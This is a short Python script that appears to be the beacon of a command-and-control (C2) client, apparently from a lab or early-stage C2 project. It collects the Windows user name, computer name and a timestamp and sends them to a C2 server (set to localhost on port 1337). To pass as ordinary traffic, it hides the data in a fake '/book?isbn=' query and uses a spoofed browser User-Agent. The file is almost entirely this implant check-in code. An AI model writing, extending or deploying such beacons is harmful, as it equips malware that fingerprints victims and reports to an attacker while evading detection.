from os import getenv
from time import time

from requests import get

HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/120.0.0.0 Safari/537.36"}

PROXY = None
PORT = 1337
C2_SERVER = "localhost"
CMD_REQUEST = "/book?isbn="

client = getenv("USERNAME") + "@" + getenv("COMPUTERNAME") + "@" + str(time())

x = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
print(x.status_code)
